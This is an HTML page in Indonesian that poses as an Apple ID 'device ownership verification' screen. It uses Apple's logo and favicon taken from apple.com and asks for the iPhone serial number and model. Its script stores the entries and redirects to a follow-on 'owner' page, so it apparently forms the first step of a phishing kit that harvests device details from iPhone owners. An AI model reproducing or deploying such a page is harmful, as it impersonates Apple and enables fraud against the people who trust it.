<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Kepemilikan Perangkat - Apple ID</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="https://www.apple.com/favicon.ico">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" alt="Apple Logo" class="logo">
            <h1>Verifikasi Kepemilikan Perangkat</h1>
            <p class="subtitle">Kami perlu memverifikasi bahwa Anda adalah pemilik sah perangkat ini.</p>
            
            <form id="verificationForm">
                <div class="input-group">
                    <input type="text" name="serialNumber" id="serialNumber" required placeholder=" ">
                    <label for="serialNumber">Nomor Seri (Serial Number)</label>
                </div>
                
                <div class="input-group select-group">
                    <select name="deviceModel" id="deviceModel" required>
                        <option value="" disabled selected>Pilih model</option>
                        <option value="iPhone 13">iPhone 13</option>
                        <option value="iPhone 13 Pro">iPhone 13 Pro</option>
                        <option value="iPhone 14">iPhone 14</option>
                        <option value="iPhone 15">iPhone 15</option>
                        <option value="iPhone 15 Pro Max">iPhone 15 Pro Max</option>
                    </select>
                    <label for="deviceModel">Model Perangkat</label>
                </div>
                
                <button type="submit">Lanjutkan</button>
            </form>
            
            <div class="links">
                <a href="#">Bantuan</a>
                <a href="#">Hubungi Apple Support</a>
                <a href="#">Privacy Policy</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('verificationForm');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get form data
                const serialNumber = document.getElementById('serialNumber').value;
                const deviceModel = document.getElementById('deviceModel').value;
                
                // Store data in sessionStorage for potential use later
                sessionStorage.setItem('serialNumber', serialNumber);
                sessionStorage.setItem('deviceModel', deviceModel);
                
                // Redirect to next page
                window.location.href = 'pemilik.html';
            });
        });
    </script>
</body>
</html>
